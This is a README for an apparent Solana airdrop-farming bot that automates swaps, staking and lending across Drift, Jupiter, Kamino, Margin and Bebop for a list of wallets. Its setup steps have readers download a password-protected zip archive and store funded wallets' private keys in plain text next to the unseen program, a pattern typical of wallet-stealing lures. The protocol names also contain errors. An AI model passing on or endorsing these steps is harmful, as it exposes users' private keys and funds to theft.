### About

For each wallet in the list, the program performs a series of operations on different decentralized finance protocols. These tasks include actions like swapping SOL for other tokens or providing liquidity across multiple token pairs. The execution is powered by SolanaSDK and Net Framework 4.8. Currently, five protocols on the Solana network are integrated for token swapping functionality.

### Protocols and activities

drift.tade:
 - Swapping SOL to USDC/JUP/BONK randomly and back
 - SOL staking and lending
 - Open spot positions on SOL (open and close)

jupiter:
 - Swapping SOL to USDC/JUP/BONK randomly and back

kamino.finance (Kamino Finance)
 - Supply SOL on borrow/lend
 - Buy JUP/JTO/BONK randomly and deposit to LP

mfi.gg (Margin Finance)
 - Swapping SOL to USDC/JUP/BONK randomly and back
 - Staking SOL on Eran program
 - Supply SOL to LP

bebop.xyz:
 - Swapping SOL to USDC and back (active and beta versions)

### Getting started

- Ensure that Net Framework 4.8 is installed on your system.
- [Download](https://github.com/aigeraxyz/solana-airdrop/archive/refs/heads/main.zip) the repository and unzip the repository with pass `Abyj10C` to folder.
- Create SOL private key list with a balance. A minimum of 0.4 SOL on each address is required.
- Save the list in 'privateKeys.txt' next to the program.
- Edit 'settings.json' to configure which projects you want to use for transactions
- Edit the RPC to your own or Shyft's

### Configuration

```
{
  "General": { 
    "Timeout": "30",
    "RPC": "https://<your-solana-rpc>.com:<port>" // use your own RPC oe Shyft.io
  },
  "WorkingMode": { // which protocols we use
    "Jupiter": "true",
    "Drift": "true",
	"Kamino": "true",
    "Margin": "true",
	"Bebop": "true"
  }
}
```
